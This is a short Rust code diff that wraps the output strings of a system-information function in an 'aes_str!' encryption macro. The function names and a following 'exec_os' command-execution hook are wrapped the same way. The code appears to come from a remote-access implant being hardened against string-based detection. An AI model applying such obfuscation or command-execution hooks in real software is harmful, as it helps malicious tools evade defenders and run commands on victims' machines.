@@ -13,7 +13,7 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_sysinfo"), || -> String {
         let hostname = sys_info::hostname().unwrap_or_default();
         let os       = sys_info::os_release().unwrap_or_default();
-        format!("Host: {}\nOS: {}", hostname, os)
+        format!("{}{}{}{}", aes_str!("Host: "), hostname, aes_str!("\nOS: "), os)
     });
 
     engine.register_fn(&aes_str!("exec_os"), |cmd: &str| -> String {
